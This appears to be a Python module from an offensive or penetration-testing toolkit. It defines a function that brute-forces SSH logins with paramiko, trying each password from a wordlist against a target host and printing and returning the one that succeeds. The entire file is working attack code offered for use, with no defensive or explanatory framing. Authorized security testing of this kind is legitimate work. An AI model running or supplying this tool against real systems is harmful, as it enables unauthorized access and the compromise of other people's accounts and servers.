import paramiko
from typing import Optional
from .utils import clear_line

def ssh_bruteforce(host: str, username: str, wordlist_path: str, port: int = 22) -> Optional[str]:
    """
    Attempt SSH brute force attack using a password wordlist.

    Args:
        host (str): Target hostname or IP address.
        username (str): Username to authenticate.
        wordlist_path (str): Path to file containing passwords (one per line).
        port (int): SSH port. Defaults to 22.

    Returns:
        Optional[str]: The password if authentication succeeds; otherwise None.
    """
    with open(wordlist_path, "r") as file:
        for line in file:
            password = line.strip()
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            clear_line()
            print(f"[?] Trying password: {password}", end="\r")
            try:
                client.connect(hostname=host, port=port, username=username, password=password, timeout=3)
                print(f"[+] SSH login succeeded: {username}:{password}")
                return password
            except paramiko.AuthenticationException:
                clear_line()
                print(f"[-] SSH login failed for {username}:{password}", end="\r")
                pass
            except Exception as e:
                clear_line()   
                print(f"Connection error or other SSH issues: {e}. Continuing...", end="\r")
                pass
            finally:
                client.close()

    return None
